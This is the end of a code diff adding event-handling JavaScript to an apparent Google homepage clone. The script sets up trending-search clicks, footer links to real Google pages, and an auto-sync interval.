+          openGoogleLink('https://www.google.com/imghp');
+        }
+        return false;
+      });
+    });
+    
+    document.querySelectorAll('.trend').forEach(trend => {
+      trend.addEventListener('click', function() {
+        const searchTerm = this.querySelector('.trend-text').textContent;
+        searchInput.value = searchTerm;
+        performSearch(searchTerm);
+      });
+    });
+    
+    const footerLinks = {
+      'settingsBtn': 'https://www.google.com/preferences',
+      'privacyBtn': 'https://policies.google.com/privacy',
+      'termsBtn': 'https://policies.google.com/terms',
+      'advertisingBtn': 'https://www.google.com/intl/id_id/ads',
+      'businessBtn': 'https://www.google.com/services',
+      'aboutBtn': 'https://www.google.com/intl/id_id/about'
+    };
+    
+    Object.keys(footerLinks).forEach(id => {
+      document.getElementById(id).addEventListener('click', function(e) {
+        e.preventDefault();
+        openGoogleLink(footerLinks[id]);
+        return false;
+      });
+    });
+    
+    setupDoubleClickHandler();
+  }
+
+  function init() {
+    setupEventListeners();
+    startAutoSync();
+    console.log('Google Clone dengan Pop-up Mode - Siap digunakan');
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+
+  window.addEventListener('beforeunload', function() {
+    if (syncInterval) {
+      clearInterval(syncInterval);
+    }
+  });
+</script>
 </body>
 </html>
